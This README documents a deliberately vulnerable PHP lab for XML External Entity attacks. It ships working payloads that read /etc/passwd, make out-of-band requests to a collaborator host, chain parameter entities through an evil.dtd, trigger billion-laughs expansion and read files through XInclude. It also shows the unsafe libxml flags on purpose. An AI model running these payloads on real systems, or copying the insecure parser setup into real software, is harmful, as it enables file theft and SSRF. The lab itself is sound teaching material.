# xxe-basic

A deliberately vulnerable PHP app that demonstrates the major XML External Entity (XXE) attack flavours against PHP's libxml-based `DOMDocument`. Companion lab for the upcoming TechEarl XXE article.

The parser is configured with `LIBXML_NOENT | LIBXML_DTDLOAD | LIBXML_NOCDATA`, which is the unsafe combination: it substitutes external entities into the output tree and allows the inline `DOCTYPE` to dereference `SYSTEM` URIs. XInclude processing is also explicitly opted into via `$dom->xinclude()`. The default protection against entity-expansion DoS (billion laughs) is left ON, which is why scenario 3 below fails gracefully and stays an "Error".

## Endpoints

| Endpoint | Method | Behaviour |
|---|---|---|
| `/import.php` | POST | Parses XML body, echoes every `<name>` back into the HTML response. Vulnerable to in-band XXE, XInclude, and demonstrates the billion-laughs mitigation. |
| `/upload-blind.php` | POST | Same parser, but the response is hard-wired to `OK` / `Error`. No parsed content leaks back. Used for blind XXE via parameter entities and the collaborator server. |

## Companion container

`xxe-basic-collab` is a tiny Python HTTP server that:

- Serves `http://xxe-basic-collab/evil.dtd` to anyone on the Docker network.
- Logs every incoming request line (method, path, query) to stdout.

It has **no published port**, on purpose. The only thing that can reach it is the sibling lab container. The blind-XXE scenario causes the lab to issue an out-of-band HTTP request to the collaborator with the exfiltrated bytes in the URL path, and you read them out of `docker compose logs xxe-basic-collab`.

## Boot

From the root of the `techearl-labs` repo, after merging `docker-compose.snippet.yml` into the root compose file:

```bash
docker compose up xxe-basic
```

App is at `http://localhost:8086`. The collaborator is only reachable from inside the Docker network as `xxe-basic-collab:80`.

In a second terminal:

```bash
docker compose logs -f xxe-basic-collab
```

## Expected exploit paths

All four scenarios use the same `curl` shape:

```bash
curl -s -X POST --data-binary @payload.xml \
  -H 'Content-Type: application/xml' \
  http://localhost:8086/import.php
```

### 1. Classic in-band XXE file read

Saves to `payload.xml`, POST to `/import.php`. The parser substitutes `&xxe;` with the contents of `/etc/passwd` before the application iterates `<name>` nodes and echoes them.

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<bookmarks>
  <bookmark><name>&xxe;</name><url>http://x</url></bookmark>
</bookmarks>
```

Expected: the response includes a `<div class="bookmark">` whose `<strong>` is the full `/etc/passwd` content from the container.

### 2. Blind XXE: out-of-band HTTP exfil

POST to `/upload-blind.php`. The response is just `OK`, but libxml fetches the SYSTEM URL when it resolves the `&exfil;` reference, and the request lands in the collaborator log.

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY exfil SYSTEM "http://xxe-basic-collab/?leak=fired">
]>
<bookmarks>
  <bookmark><name>&exfil;</name><url>http://x</url></bookmark>
</bookmarks>
```

Then tail the collaborator:

```bash
docker compose logs -f xxe-basic-collab
```

Expected: a line of the form `[collab] GET from <ip> path=/?leak=fired`. This proves the OOB primitive works: the lab's libxml resolves the external entity by issuing an outbound HTTP request to a server the attacker controls, even though the endpoint reflects nothing back in its own response.

#### A note on the textbook "parameter entity recursive DTD" pattern

Most XXE write-ups demonstrate blind file-content exfil with a recursive parameter-entity chain in an external DTD:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % remote SYSTEM "http://xxe-basic-collab/evil.dtd">
  %remote;
]>
<bookmarks>
  <bookmark><name>x</name><url>http://x</url></bookmark>
</bookmarks>
```

where `evil.dtd` defines `%file` (reads a local file), then uses `%eval` to declare a new entity `%exfil` whose SYSTEM URL embeds `%file;` in its query string, then forces `%exfil;` to resolve. The lab ships such an `evil.dtd` under `xxe-basic-collab/`.

Against this lab's libxml (2.9.14 on PHP 8.2) the DTD itself loads (the collaborator logs `GET /evil.dtd`) but the second-stage `%exfil` GET never fires. libxml has tightened parameter-entity processing across the 2.9.x series and now refuses to define a new entity inside the expansion of another entity loaded from an external DTD, which is the mechanic that classic OOB file-content exfil depends on.

This is real, current 2026 behaviour. The OOB primitive (this scenario) still works; the file-content-exfil-via-recursive-PE pattern works only against older or differently-configured parsers. The article walks both: the textbook pattern as the historical baseline, the direct-entity OOB as the version that fires today.

### 3. Billion laughs (entity expansion DoS, mitigated by default)

POST to `/import.php`. libxml's entity-expansion limit refuses to expand the document and the endpoint returns an XML parse error.

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
]>
<bookmarks>
  <bookmark><name>&lol6;</name><url>http://x</url></bookmark>
</bookmarks>
```

Expected: `XML parse error` with a libxml diagnostic about the entity expansion limit. Container CPU and memory stay flat. This is the point: the lab demonstrates the attack AND the default mitigation that already blocks it. Passing `LIBXML_PARSEHUGE` to `loadXML` would disable that limit; the lab does not pass it.

### 4. XInclude file read

POST to `/import.php`. XInclude is a separate libxml feature that has to be opted into; the application calls `$dom->xinclude()` on the parsed document, which expands `<xi:include>` nodes in place.

```xml
<?xml version="1.0"?>
<bookmarks xmlns:xi="http://www.w3.org/2001/XInclude">
  <bookmark>
    <name><xi:include href="file:///etc/hostname" parse="text"/></name>
    <url>http://x</url>
  </bookmark>
</bookmarks>
```

Expected: the response renders the container's hostname inside the `<strong>` of the bookmark. No DOCTYPE, no `<!ENTITY>` declaration; the XInclude path is independent of entity processing and is often missed by audits that only look for inline DTDs.

## Tearing down

```bash
docker compose down xxe-basic xxe-basic-collab
```

No persistent volumes are written by either container, so there is nothing to purge between attempts.

## Safety

Bound to `127.0.0.1` by default. The collaborator container has no published port at all. Do not expose either container to a public interface: the lab parses attacker-controlled XML with external entities enabled, which trivially exposes any file the `www-data` user can read inside the container and can be turned into SSRF against anything on the host network.
